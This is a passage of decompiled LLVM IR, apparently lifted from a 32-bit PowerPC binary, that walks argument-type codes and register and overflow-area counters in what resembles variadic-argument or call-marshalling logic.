  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10005e18 = load i32, i32* @r3, align 4
  %v1_10005e18 = add i32 %v0_10005e18, 24
  %v2_10005e18 = inttoptr i32 %v1_10005e18 to i32*
  %v3_10005e18 = load i32, i32* %v2_10005e18, align 4
  store i32 %v3_10005e18, i32* %r0.global-to-local, align 4
  %v1_10005e1c = add i32 %v0_10005e18, 88
  store i32 %v1_10005e1c, i32* %r8.global-to-local, align 4
  %v1_10005e20 = add i32 %v0_10005e18, 8
  %v2_10005e20 = inttoptr i32 %v1_10005e20 to i32*
  %v3_10005e20 = load i32, i32* %v2_10005e20, align 4
  store i32 %v3_10005e20, i32* %r9.global-to-local, align 4
  %v2_10005e24 = icmp sgt i32 %v3_10005e18, 0
  %v3_10005e24 = icmp eq i32 %v3_10005e18, 0
  store i1 %v2_10005e24, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10005e24, label %dec_label_pc_10005e2c, label %dec_label_pc_10006018

dec_label_pc_10005e2c:                            ; preds = %dec_label_pc_10005e18
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_10005e30 = icmp ne i32 %v3_10005e20, -2147483648
  %v4_10005e30 = icmp eq i32 %v3_10005e20, -2147483648
  store i1 %v3_10005e30, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10005e30, label %dec_label_pc_10005e38, label %dec_label_pc_10005e78

dec_label_pc_10005e38:                            ; preds = %dec_label_pc_10005e2c
  %v1_10005e38 = add i32 %v0_10005e18, 76
  %v2_10005e38 = inttoptr i32 %v1_10005e38 to i8*
  %v3_10005e38 = load i8, i8* %v2_10005e38, align 1
  %v4_10005e38 = zext i8 %v3_10005e38 to i32
  store i32 %v4_10005e38, i32* %r11.global-to-local, align 4
  store i32 %v1_10005e38, i32* %r10.global-to-local, align 4
  %v2_10005e40 = icmp ugt i8 %v3_10005e38, 8
  store i1 %v2_10005e40, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_10005e38, 7
  br i1 %tmp, label %dec_label_pc_10005e60, label %dec_label_pc_10005e48

dec_label_pc_10005e48:                            ; preds = %dec_label_pc_10005e38
  %v1_10005e48 = add i32 %v0_10005e18, 84
  %v2_10005e48 = inttoptr i32 %v1_10005e48 to i32*
  %v3_10005e48 = load i32, i32* %v2_10005e48, align 4
  store i32 %v3_10005e48, i32* %r0.global-to-local, align 4
  %v1_10005e4c = mul nuw nsw i32 %v4_10005e38, 4
  store i32 %v1_10005e4c, i32* %r9.global-to-local, align 4
  %v1_10005e50 = add nuw nsw i32 %v4_10005e38, 1
  store i32 %v1_10005e50, i32* %r11.global-to-local, align 4
  %v1_10005e54 = trunc i32 %v1_10005e50 to i8
  store i8 %v1_10005e54, i8* %v2_10005e38, align 1
  %v0_10005e58 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005e58 = load i32, i32* %r0.global-to-local, align 4
  %v2_10005e58 = add i32 %v1_10005e58, %v0_10005e58
  store i32 %v2_10005e58, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10005e6c

dec_label_pc_10005e60:                            ; preds = %dec_label_pc_10005e38
  %v1_10005e60 = add i32 %v0_10005e18, 80
  %v2_10005e60 = inttoptr i32 %v1_10005e60 to i32*
  %v3_10005e60 = load i32, i32* %v2_10005e60, align 4
  store i32 %v3_10005e60, i32* %r9.global-to-local, align 4
  %v1_10005e64 = add i32 %v3_10005e60, 4
  store i32 %v1_10005e64, i32* %r0.global-to-local, align 4
  store i32 %v1_10005e64, i32* %v2_10005e60, align 4
  %v0_10005e6c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10005e6c

dec_label_pc_10005e6c:                            ; preds = %dec_label_pc_10005e48, %dec_label_pc_10005e60
  %v0_10005e6c = phi i32 [ %v2_10005e58, %dec_label_pc_10005e48 ], [ %v0_10005e6c.pre, %dec_label_pc_10005e60 ]
  %v1_10005e6c = inttoptr i32 %v0_10005e6c to i32*
  %v2_10005e6c = load i32, i32* %v1_10005e6c, align 4
  store i32 %v2_10005e6c, i32* %r0.global-to-local, align 4
  %v1_10005e70 = load i32, i32* %r8.global-to-local, align 4
  %v2_10005e70 = inttoptr i32 %v1_10005e70 to i32*
  store i32 %v2_10005e6c, i32* %v2_10005e70, align 4
  %v0_10005e74 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005e74 = load i32, i32* @r3, align 4
  %v2_10005e74 = add i32 %v1_10005e74, 8
  %v3_10005e74 = inttoptr i32 %v2_10005e74 to i32*
  store i32 %v0_10005e74, i32* %v3_10005e74, align 4
  %v0_10005e78.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10005e78

dec_label_pc_10005e78:                            ; preds = %dec_label_pc_10005e2c, %dec_label_pc_10005e6c
  %v2_10005ea4 = phi i32 [ %v0_10005e18, %dec_label_pc_10005e2c ], [ %v0_10005e78.pre, %dec_label_pc_10005e6c ]
  %v1_10005e78 = add i32 %v2_10005ea4, 4
  %v2_10005e78 = inttoptr i32 %v1_10005e78 to i32*
  %v3_10005e78 = load i32, i32* %v2_10005e78, align 4
  store i32 %v3_10005e78, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_10005e80 = icmp ne i32 %v3_10005e78, -2147483648
  %v4_10005e80 = icmp eq i32 %v3_10005e78, -2147483648
  store i1 %v3_10005e80, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10005e80, label %dec_label_pc_10005e88, label %dec_label_pc_10006008.preheader

dec_label_pc_10005e88:                            ; preds = %dec_label_pc_10005e78
  %v1_10005e88 = add i32 %v2_10005ea4, 76
  %v2_10005e88 = inttoptr i32 %v1_10005e88 to i8*
  %v3_10005e88 = load i8, i8* %v2_10005e88, align 1
  %v4_10005e88 = zext i8 %v3_10005e88 to i32
  store i32 %v4_10005e88, i32* %r11.global-to-local, align 4
  store i32 %v1_10005e88, i32* %r10.global-to-local, align 4
  %v2_10005e90 = icmp ugt i8 %v3_10005e88, 8
  store i1 %v2_10005e90, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_10005e88, 7
  br i1 %tmp26, label %dec_label_pc_10005eb0, label %dec_label_pc_10005e98

dec_label_pc_10005e98:                            ; preds = %dec_label_pc_10005e88
  %v1_10005e98 = add i32 %v2_10005ea4, 84
  %v2_10005e98 = inttoptr i32 %v1_10005e98 to i32*
  %v3_10005e98 = load i32, i32* %v2_10005e98, align 4
  store i32 %v3_10005e98, i32* %r0.global-to-local, align 4
  %v1_10005e9c = mul nuw nsw i32 %v4_10005e88, 4
  store i32 %v1_10005e9c, i32* %r9.global-to-local, align 4
  %v1_10005ea0 = add nuw nsw i32 %v4_10005e88, 1
  store i32 %v1_10005ea0, i32* %r11.global-to-local, align 4
  %v1_10005ea4 = trunc i32 %v1_10005ea0 to i8
  store i8 %v1_10005ea4, i8* %v2_10005e88, align 1
  %v0_10005ea8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005ea8 = load i32, i32* %r0.global-to-local, align 4
  %v2_10005ea8 = add i32 %v1_10005ea8, %v0_10005ea8
  store i32 %v2_10005ea8, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10005ebc

dec_label_pc_10005eb0:                            ; preds = %dec_label_pc_10005e88
  %v1_10005eb0 = add i32 %v2_10005ea4, 80
  %v2_10005eb0 = inttoptr i32 %v1_10005eb0 to i32*
  %v3_10005eb0 = load i32, i32* %v2_10005eb0, align 4
  store i32 %v3_10005eb0, i32* %r9.global-to-local, align 4
  %v1_10005eb4 = add i32 %v3_10005eb0, 4
  store i32 %v1_10005eb4, i32* %r0.global-to-local, align 4
  store i32 %v1_10005eb4, i32* %v2_10005eb0, align 4
  %v0_10005ebc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10005ebc

dec_label_pc_10005ebc:                            ; preds = %dec_label_pc_10005e98, %dec_label_pc_10005eb0
  %v0_10005ebc = phi i32 [ %v2_10005ea8, %dec_label_pc_10005e98 ], [ %v0_10005ebc.pre, %dec_label_pc_10005eb0 ]
  %v1_10005ebc = inttoptr i32 %v0_10005ebc to i32*
  %v2_10005ebc = load i32, i32* %v1_10005ebc, align 4
  store i32 %v2_10005ebc, i32* %r0.global-to-local, align 4
  %v1_10005ec0 = load i32, i32* %r8.global-to-local, align 4
  %v2_10005ec0 = inttoptr i32 %v1_10005ec0 to i32*
  store i32 %v2_10005ebc, i32* %v2_10005ec0, align 4
  %v0_10005ec4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005ec4 = load i32, i32* @r3, align 4
  %v2_10005ec4 = add i32 %v1_10005ec4, 4
  %v3_10005ec4 = inttoptr i32 %v2_10005ec4 to i32*
  store i32 %v0_10005ec4, i32* %v3_10005ec4, align 4
  %v0_100060085.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10006008.preheader

dec_label_pc_10006008.preheader:                  ; preds = %dec_label_pc_10005e78, %dec_label_pc_10005ebc
  %v0_100060085 = phi i32 [ %v2_10005ea4, %dec_label_pc_10005e78 ], [ %v0_100060085.pre, %dec_label_pc_10005ebc ]
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_100060086 = add i32 %v0_100060085, 28
  %v2_100060087 = inttoptr i32 %v1_100060086 to i32*
  %v3_100060088 = load i32, i32* %v2_100060087, align 4
  store i32 %v3_100060088, i32* %r0.global-to-local, align 4
  %v2_1000600c9 = icmp sgt i32 %v3_100060088, 0
  %v3_1000600c10 = icmp slt i32 %v3_100060088, 0
  store i1 %v3_1000600c10, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000600c9, label %dec_label_pc_10005ed0, label %dec_label_pc_10006058

dec_label_pc_10005ed0:                            ; preds = %dec_label_pc_10006008.preheader, %dec_label_pc_10006004
  %v2_10005fe0 = phi i32 [ %v0_10006008, %dec_label_pc_10006004 ], [ %v0_100060085, %dec_label_pc_10006008.preheader ]
  %v0_10005ed0 = phi i32 [ %v1_10006004, %dec_label_pc_10006004 ], [ 0, %dec_label_pc_10006008.preheader ]
  %v1_10005ed0 = mul i32 %v0_10005ed0, 4
  %v2_10005ed4 = add i32 %v1_10005ed0, %v2_10005fe0
  store i32 %v2_10005ed4, i32* %r9.global-to-local, align 4
  %v1_10005ed8 = add i32 %v2_10005ed4, 40
  %v2_10005ed8 = inttoptr i32 %v1_10005ed8 to i32*
  %v3_10005ed8 = load i32, i32* %v2_10005ed8, align 4
  store i32 %v3_10005ed8, i32* %r0.global-to-local, align 4
  %v2_10005edc = icmp sgt i32 %v3_10005ed8, 8
  %v3_10005edc = icmp eq i32 %v3_10005ed8, 8
  store i1 %v2_10005edc, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10005edc, label %dec_label_pc_10006004, label %dec_label_pc_10005ee4

dec_label_pc_10005ee4:                            ; preds = %dec_label_pc_10005ed0
  %v1_10005ee4 = add i32 %v2_10005fe0, 76
  store i32 %v1_10005ee4, i32* %r10.global-to-local, align 4
  br i1 %v2_10005edc, label %dec_label_pc_10005f00, label %dec_label_pc_10005eec

dec_label_pc_10005eec:                            ; preds = %dec_label_pc_10005ee4
  %v2_10005eec = icmp sgt i32 %v3_10005ed8, 2
  store i1 %v2_10005eec, i1* %cr7_gt.global-to-local, align 1
  %tmp27 = icmp slt i32 %v3_10005ed8, 3
  br i1 %tmp27, label %dec_label_pc_10005fc8, label %dec_label_pc_10005f18

dec_label_pc_10005f00:                            ; preds = %dec_label_pc_10005ee4
  %v2_10005f00 = icmp sgt i32 %v3_10005ed8, 1024
  store i1 %v2_10005f00, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = icmp slt i32 %v3_10005ed8, 1025
  br i1 %tmp28, label %dec_label_pc_10005fc8, label %dec_label_pc_10005f0c

dec_label_pc_10005f0c:                            ; preds = %dec_label_pc_10005f00
  %v2_10005f0c = icmp sgt i32 %v3_10005ed8, 2048
  %v3_10005f0c = icmp eq i32 %v3_10005ed8, 2048
  store i1 %v2_10005f0c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10005f0c, label %dec_label_pc_10005f20, label %dec_label_pc_10005f14

dec_label_pc_10005f14:                            ; preds = %dec_label_pc_10005f0c
  %v2_10005f14 = icmp sgt i32 %v3_10005ed8, 2055
  %v3_10005f14 = icmp eq i32 %v3_10005ed8, 2055
  store i1 %v2_10005f14, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10005f14, label %dec_label_pc_10005f7c, label %dec_label_pc_10005fc8

dec_label_pc_10005f18:                            ; preds = %dec_label_pc_10005eec
  %v3_10005ef8 = icmp eq i32 %v3_10005ed8, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10005ef8, label %dec_label_pc_10005f7c, label %dec_label_pc_10005fc8

dec_label_pc_10005f20:                            ; preds = %dec_label_pc_10005f0c
  %v2_10005f20 = inttoptr i32 %v1_10005ee4 to i8*
  %v3_10005f20 = load i8, i8* %v2_10005f20, align 1
  %v4_10005f20 = zext i8 %v3_10005f20 to i32
  store i32 %v4_10005f20, i32* %r0.global-to-local, align 4
  %tmp32 = urem i8 %v3_10005f20, 2
  %v1_10005f24 = zext i8 %tmp32 to i32
  %v2_10005f28 = icmp ugt i8 %v3_10005f20, 6
  store i1 %v2_10005f28, i1* %cr7_gt.global-to-local, align 1
  %v2_10005f2c = add nuw nsw i32 %v1_10005f24, %v4_10005f20
  store i32 %v2_10005f2c, i32* %r9.global-to-local, align 4
  %v1_10005f30 = trunc i32 %v2_10005f2c to i8
  store i8 %v1_10005f30, i8* %v2_10005f20, align 1
  %v0_10005f34 = load i1, i1* %cr7_gt.global-to-local, align 1
  %v0_10005f54 = load i32, i32* %r10.global-to-local, align 4
  br i1 %v0_10005f34, label %dec_label_pc_10005f54, label %dec_label_pc_10005f38

dec_label_pc_10005f38:                            ; preds = %dec_label_pc_10005f20
  %v1_10005f38 = add i32 %v0_10005f54, 8
  %v2_10005f38 = inttoptr i32 %v1_10005f38 to i32*
  %v3_10005f38 = load i32, i32* %v2_10005f38, align 4
  store i32 %v3_10005f38, i32* %r0.global-to-local, align 4
  %v0_10005f3c = load i32, i32* %r9.global-to-local, align 4
  %v1_10005f3c = urem i32 %v0_10005f3c, 256
  %v1_10005f40 = mul nuw nsw i32 %v1_10005f3c, 4
  store i32 %v1_10005f40, i32* %r11.global-to-local, align 4
  %v1_10005f44 = add nuw nsw i32 %v1_10005f3c, 2
  store i32 %v1_10005f44, i32* %r9.global-to-local, align 4
  %v1_10005f48 = trunc i32 %v1_10005f44 to i8
  %v2_10005f48 = load i32, i32* @r3, align 4
  %v3_10005f48 = add i32 %v2_10005f48, 76
  %v4_10005f48 = inttoptr i32 %v3_10005f48 to i8*
  store i8 %v1_10005f48, i8* %v4_10005f48, align 1
  %v0_10005f4c = load i32, i32* %r11.global-to-local, align 4
  %v1_10005f4c = load i32, i32* %r0.global-to-local, align 4
  %v2_10005f4c = add i32 %v1_10005f4c, %v0_10005f4c
  store i32 %v2_10005f4c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10005f68

dec_label_pc_10005f54:                            ; preds = %dec_label_pc_10005f20
  %v1_10005f54 = add i32 %v0_10005f54, 4
  %v2_10005f54 = inttoptr i32 %v1_10005f54 to i32*
  %v3_10005f54 = load i32, i32* %v2_10005f54, align 4
  %v1_10005f58 = add i32 %v3_10005f54, 7
  store i32 %v1_10005f58, i32* %r9.global-to-local, align 4
  %v1_10005f5c = call i32 @__asm_rlwinm(i32 %v1_10005f58, i32 0, i32 0, i32 28)
  store i32 %v1_10005f5c, i32* %r11.global-to-local, align 4
  %v1_10005f60 = add i32 %v1_10005f5c, 8
  store i32 %v1_10005f60, i32* %r0.global-to-local, align 4
  %v1_10005f64 = load i32, i32* %r10.global-to-local, align 4
  %v2_10005f64 = add i32 %v1_10005f64, 4
  %v3_10005f64 = inttoptr i32 %v2_10005f64 to i32*
  store i32 %v1_10005f60, i32* %v3_10005f64, align 4
  %v0_10005f68.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10005f68

dec_label_pc_10005f68:                            ; preds = %dec_label_pc_10005f38, %dec_label_pc_10005f54
  %v0_10005f68 = phi i32 [ %v2_10005f4c, %dec_label_pc_10005f38 ], [ %v0_10005f68.pre, %dec_label_pc_10005f54 ]
  %v1_10005f68 = inttoptr i32 %v0_10005f68 to i32*
  %v2_10005f68 = load i32, i32* %v1_10005f68, align 4
  store i32 %v2_10005f68, i32* %r9.global-to-local, align 4
  %v1_10005f6c = add i32 %v0_10005f68, 4
  %v2_10005f6c = inttoptr i32 %v1_10005f6c to i32*
  %v3_10005f6c = load i32, i32* %v2_10005f6c, align 4
  store i32 %v3_10005f6c, i32* %r10.global-to-local, align 4
  %v1_10005f70 = load i32, i32* %r8.global-to-local, align 4
  %v2_10005f70 = inttoptr i32 %v1_10005f70 to i32*
  store i32 %v2_10005f68, i32* %v2_10005f70, align 4
  %v0_10005f74 = load i32, i32* %r10.global-to-local, align 4
  %v1_10005f74 = load i32, i32* %r8.global-to-local, align 4
  %v2_10005f74 = add i32 %v1_10005f74, 4
  %v3_10005f74 = inttoptr i32 %v2_10005f74 to i32*
  store i32 %v0_10005f74, i32* %v3_10005f74, align 4
  br label %dec_label_pc_10006000

dec_label_pc_10005f7c:                            ; preds = %dec_label_pc_10005f14, %dec_label_pc_10005f18
  store i32 %v1_10005ee4, i32* %r10.global-to-local, align 4
  %v1_10005f80 = add i32 %v2_10005fe0, 77
  %v2_10005f80 = inttoptr i32 %v1_10005f80 to i8*
  %v3_10005f80 = load i8, i8* %v2_10005f80, align 1
  %v4_10005f80 = zext i8 %v3_10005f80 to i32
  store i32 %v4_10005f80, i32* %r11.global-to-local, align 4
  %v2_10005f84 = icmp ugt i8 %v3_10005f80, 8
  store i1 %v2_10005f84, i1* %cr7_gt.global-to-local, align 1
  %tmp29 = icmp ugt i8 %v3_10005f80, 7
  br i1 %tmp29, label %dec_label_pc_10005fa8, label %dec_label_pc_10005f8c

dec_label_pc_10005f8c:                            ; preds = %dec_label_pc_10005f7c
  %v1_10005f8c = add i32 %v2_10005fe0, 84
  %v2_10005f8c = inttoptr i32 %v1_10005f8c to i32*
  %v3_10005f8c = load i32, i32* %v2_10005f8c, align 4
  store i32 %v3_10005f8c, i32* %r9.global-to-local, align 4
  %v1_10005f90 = mul nuw nsw i32 %v4_10005f80, 8
  store i32 %v1_10005f90, i32* %r0.global-to-local, align 4
  %v1_10005f94 = add nuw nsw i32 %v4_10005f80, 1
  store i32 %v1_10005f94, i32* %r11.global-to-local, align 4
  %v1_10005f98 = trunc i32 %v1_10005f94 to i8
  store i8 %v1_10005f98, i8* %v2_10005f80, align 1
  %v0_10005f9c = load i32, i32* %r9.global-to-local, align 4
  %v1_10005f9c = add i32 %v0_10005f9c, 32
  %v1_10005fa0 = load i32, i32* %r0.global-to-local, align 4
  %v2_10005fa0 = add i32 %v1_10005f9c, %v1_10005fa0
  store i32 %v2_10005fa0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10006000

dec_label_pc_10005fa8:                            ; preds = %dec_label_pc_10005f7c
  %v1_10005fa8 = add i32 %v2_10005fe0, 80
  %v2_10005fa8 = inttoptr i32 %v1_10005fa8 to i32*
  %v3_10005fa8 = load i32, i32* %v2_10005fa8, align 4
  %v1_10005fac = add i32 %v3_10005fa8, 7
  store i32 %v1_10005fac, i32* %r9.global-to-local, align 4
  %v1_10005fb0 = call i32 @__asm_rlwinm(i32 %v1_10005fac, i32 0, i32 0, i32 28)
  store i32 %v1_10005fb0, i32* %r9.global-to-local, align 4
  %v1_10005fb4 = add i32 %v1_10005fb0, 8
  store i32 %v1_10005fb4, i32* %r0.global-to-local, align 4
  %v1_10005fb8 = load i32, i32* %r10.global-to-local, align 4
  %v2_10005fb8 = add i32 %v1_10005fb8, 4
  %v3_10005fb8 = inttoptr i32 %v2_10005fb8 to i32*
  store i32 %v1_10005fb4, i32* %v3_10005fb8, align 4
  br label %dec_label_pc_10006000

dec_label_pc_10005fc8:                            ; preds = %dec_label_pc_10005f14, %dec_label_pc_10005f18, %dec_label_pc_10005f00, %dec_label_pc_10005eec
  %v2_10005fc8 = inttoptr i32 %v1_10005ee4 to i8*
  %v3_10005fc8 = load i8, i8* %v2_10005fc8, align 1
  %v4_10005fc8 = zext i8 %v3_10005fc8 to i32
  store i32 %v4_10005fc8, i32* %r11.global-to-local, align 4
  %v2_10005fcc = icmp ugt i8 %v3_10005fc8, 8
  store i1 %v2_10005fcc, i1* %cr7_gt.global-to-local, align 1
  %tmp30 = icmp ugt i8 %v3_10005fc8, 7
  br i1 %tmp30, label %dec_label_pc_10005fec, label %dec_label_pc_10005fd4

dec_label_pc_10005fd4:                            ; preds = %dec_label_pc_10005fc8
  %v1_10005fd4 = add i32 %v2_10005fe0, 84
  %v2_10005fd4 = inttoptr i32 %v1_10005fd4 to i32*
  %v3_10005fd4 = load i32, i32* %v2_10005fd4, align 4
  store i32 %v3_10005fd4, i32* %r0.global-to-local, align 4
  %v1_10005fd8 = mul nuw nsw i32 %v4_10005fc8, 4
  store i32 %v1_10005fd8, i32* %r9.global-to-local, align 4
  %v1_10005fdc = add nuw nsw i32 %v4_10005fc8, 1
  store i32 %v1_10005fdc, i32* %r11.global-to-local, align 4
  %v1_10005fe0 = trunc i32 %v1_10005fdc to i8
  store i8 %v1_10005fe0, i8* %v2_10005fc8, align 1
  %v0_10005fe4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005fe4 = load i32, i32* %r0.global-to-local, align 4
  %v2_10005fe4 = add i32 %v1_10005fe4, %v0_10005fe4
  store i32 %v2_10005fe4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10005ff8

dec_label_pc_10005fec:                            ; preds = %dec_label_pc_10005fc8
  %v1_10005fec = add i32 %v2_10005fe0, 80
  %v2_10005fec = inttoptr i32 %v1_10005fec to i32*
  %v3_10005fec = load i32, i32* %v2_10005fec, align 4
  store i32 %v3_10005fec, i32* %r9.global-to-local, align 4
  %v1_10005ff0 = add i32 %v3_10005fec, 4
  store i32 %v1_10005ff0, i32* %r0.global-to-local, align 4
  store i32 %v1_10005ff0, i32* %v2_10005fec, align 4
  %v0_10005ff8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10005ff8

dec_label_pc_10005ff8:                            ; preds = %dec_label_pc_10005fd4, %dec_label_pc_10005fec
  %v0_10005ff8 = phi i32 [ %v2_10005fe4, %dec_label_pc_10005fd4 ], [ %v0_10005ff8.pre, %dec_label_pc_10005fec ]
  %v1_10005ff8 = inttoptr i32 %v0_10005ff8 to i32*
  %v2_10005ff8 = load i32, i32* %v1_10005ff8, align 4
  store i32 %v2_10005ff8, i32* %r0.global-to-local, align 4
  %v1_10005ffc = load i32, i32* %r8.global-to-local, align 4
  %v2_10005ffc = inttoptr i32 %v1_10005ffc to i32*
  store i32 %v2_10005ff8, i32* %v2_10005ffc, align 4
  br label %dec_label_pc_10006000

dec_label_pc_10006000:                            ; preds = %dec_label_pc_10005fa8, %dec_label_pc_10005f8c, %dec_label_pc_10005f68, %dec_label_pc_10005ff8
  %v0_10006000 = load i32, i32* %r8.global-to-local, align 4
  %v1_10006000 = add i32 %v0_10006000, 8
  store i32 %v1_10006000, i32* %r8.global-to-local, align 4
  %v0_10006004.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_10006008.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10006004

dec_label_pc_10006004:                            ; preds = %dec_label_pc_10005ed0, %dec_label_pc_10006000
  %v0_10006008 = phi i32 [ %v2_10005fe0, %dec_label_pc_10005ed0 ], [ %v0_10006008.pre, %dec_label_pc_10006000 ]
  %v0_10006004 = phi i32 [ %v0_10005ed0, %dec_label_pc_10005ed0 ], [ %v0_10006004.pre, %dec_label_pc_10006000 ]
  %v1_10006004 = add i32 %v0_10006004, 1
  store i32 %v1_10006004, i32* %r7.global-to-local, align 4
  %v1_10006008 = add i32 %v0_10006008, 28
  %v2_10006008 = inttoptr i32 %v1_10006008 to i32*
  %v3_10006008 = load i32, i32* %v2_10006008, align 4
  store i32 %v3_10006008, i32* %r0.global-to-local, align 4
  %v2_1000600c = icmp slt i32 %v1_10006004, %v3_10006008
  %v3_1000600c = icmp sgt i32 %v1_10006004, %v3_10006008
  store i1 %v3_1000600c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000600c, label %dec_label_pc_10005ed0, label %dec_label_pc_10006058

dec_label_pc_10006018:                            ; preds = %dec_label_pc_10005e18
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_1000601c = icmp ne i32 %v3_10005e20, -2147483648
  %v4_1000601c = icmp eq i32 %v3_10005e20, -2147483648
  store i1 %v3_1000601c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000601c, label %dec_label_pc_10006024, label %dec_label_pc_10006038

dec_label_pc_10006024:                            ; preds = %dec_label_pc_10006018
  %v1_10006024 = add i32 %v0_10005e18, 36
  %v2_10006024 = inttoptr i32 %v1_10006024 to i8*
  %v3_10006024 = load i8, i8* %v2_10006024, align 1
  %v4_10006024 = zext i8 %v3_10006024 to i32
  %v1_10006028 = mul nuw nsw i32 %v4_10006024, 8
  %v2_1000602c = add i32 %v1_10006028, %v1_10005e1c
  store i32 %v2_1000602c, i32* %r9.global-to-local, align 4
  %v1_10006030 = add i32 %v2_1000602c, -8
  %v2_10006030 = inttoptr i32 %v1_10006030 to i32*
  %v3_10006030 = load i32, i32* %v2_10006030, align 4
  store i32 %v3_10006030, i32* %r0.global-to-local, align 4
  store i32 %v3_10006030, i32* %v2_10005e20, align 4
  %v0_10006038.pre = load i32, i32* @r3, align 4
  %v1_1000603c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006038

dec_label_pc_10006038:                            ; preds = %dec_label_pc_10006018, %dec_label_pc_10006024
  %v1_1000603c = phi i32 [ -2147483648, %dec_label_pc_10006018 ], [ %v1_1000603c.pre, %dec_label_pc_10006024 ]
  %v1_10006054 = phi i32 [ %v0_10005e18, %dec_label_pc_10006018 ], [ %v0_10006038.pre, %dec_label_pc_10006024 ]
  %v1_10006038 = add i32 %v1_10006054, 4
  %v2_10006038 = inttoptr i32 %v1_10006038 to i32*
  %v3_10006038 = load i32, i32* %v2_10006038, align 4
  store i32 %v3_10006038, i32* %r0.global-to-local, align 4
  %v3_1000603c = icmp sgt i32 %v3_10006038, %v1_1000603c
  %v4_1000603c = icmp eq i32 %v3_10006038, %v1_1000603c
  store i1 %v3_1000603c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000603c, label %dec_label_pc_10006044, label %dec_label_pc_10006058

dec_label_pc_10006044:                            ; preds = %dec_label_pc_10006038
  %v1_10006044 = add i32 %v1_10006054, 37
  %v2_10006044 = inttoptr i32 %v1_10006044 to i8*
  %v3_10006044 = load i8, i8* %v2_10006044, align 1
  %v4_10006044 = zext i8 %v3_10006044 to i32
  %v1_10006048 = mul nuw nsw i32 %v4_10006044, 8
  %v1_1000604c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000604c = add i32 %v1_10006048, %v1_1000604c
  store i32 %v2_1000604c, i32* %r9.global-to-local, align 4
  %v1_10006050 = add i32 %v2_1000604c, -8
  %v2_10006050 = inttoptr i32 %v1_10006050 to i32*
  %v3_10006050 = load i32, i32* %v2_10006050, align 4
  store i32 %v3_10006050, i32* %r0.global-to-local, align 4
  store i32 %v3_10006050, i32* %v2_10006038, align 4
  %v0_10006058.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10006058

dec_label_pc_10006058:                            ; preds = %dec_label_pc_10006004, %dec_label_pc_10006008.preheader, %dec_label_pc_10006038, %dec_label_pc_10006044
  %v0_10006058 = phi i32 [ %v1_10006054, %dec_label_pc_10006038 ], [ %v0_10006058.pre, %dec_label_pc_10006044 ], [ %v0_100060085, %dec_label_pc_10006008.preheader ], [ %v0_10006008, %dec_label_pc_10006004 ]
  %v1_10006058 = add i32 %v0_10006058, 8
  %v2_10006058 = inttoptr i32 %v1_10006058 to i32*
  %v3_10006058 = load i32, i32* %v2_10006058, align 4
  store i32 %v3_10006058, i32* %r11.global-to-local, align 4
  %v2_1000605c = icmp sgt i32 %v3_10006058, 0
  store i1 %v2_1000605c, i1* %cr7_gt.global-to-local, align 1
  %v0_10006060 = load i32, i32* @lr, align 4
  %tmp31 = icmp sgt i32 %v3_10006058, -1
  call void @__pseudo_cond_branch(i1 %tmp31, i32 %v0_10006060)
  %v0_10006064 = load i32, i32* @r3, align 4
  %v1_10006064 = add i32 %v0_10006064, 16
  %v2_10006064 = inttoptr i32 %v1_10006064 to i32*
  %v3_10006064 = load i32, i32* %v2_10006064, align 4
  store i32 %v3_10006064, i32* %r0.global-to-local, align 4
  %v0_10006068 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006068 = sub i32 0, %v0_10006068
  store i32 %v1_10006068, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_10006070 = add i32 %v0_10006064, 8
  %v3_10006070 = inttoptr i32 %v2_10006070 to i32*
  store i32 %v1_10006068, i32* %v3_10006070, align 4
  %v0_10006074 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006074 = load i32, i32* @r3, align 4
  %v2_10006074 = add i32 %v1_10006074, 20
  %v3_10006074 = inttoptr i32 %v2_10006074 to i32*
  store i32 %v0_10006074, i32* %v3_10006074, align 4
  %v0_10006078 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006078 = or i32 %v0_10006078, 8
  store i32 %v1_10006078, i32* %r0.global-to-local, align 4
